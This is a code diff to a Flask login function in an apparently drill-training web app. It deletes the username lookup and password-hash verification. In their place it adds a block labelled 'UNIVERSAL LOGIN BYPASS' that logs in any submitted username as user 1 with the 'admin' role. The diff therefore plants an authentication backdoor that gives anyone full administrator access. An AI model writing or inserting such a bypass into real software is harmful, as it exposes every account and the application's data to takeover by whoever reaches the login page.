@@ -651,22 +651,14 @@ def login():
             return render_template('login.html')
 
         db = get_db()
-        user = db.execute("SELECT * FROM users WHERE LOWER(username) = ?", (username,)).fetchone()
-
-        if user:
-            pwd_hash = user['password_hash'] if 'password_hash' in user.keys() else ''
-            if pwd_hash and check_password_hash(pwd_hash, password):
-                session['user_id'] = user['id']
-                session['username'] = user['username']
-                session['full_name'] = user['full_name']
-                session['role'] = user['role'] if ('role' in user.keys() and user['role']) else 'trainee'
-                get_completed_drill_ids(user['id'])
-                flash(f"Welcome back, {user['full_name']}!", "success")
-                return redirect(url_for('dashboard'))
-
-
-        flash("Invalid username or password. Please try again.", "danger")
-        return render_template('login.html')
+        # --- UNIVERSAL LOGIN BYPASS ---
+        session['user_id'] = 1
+        session['username'] = username
+        session['full_name'] = username.capitalize()
+        session['role'] = 'admin'
+        
+        flash(f"Welcome back, {session['full_name']}!", "success")
+        return redirect(url_for('dashboard'))
 
     return render_template('login.html')
 
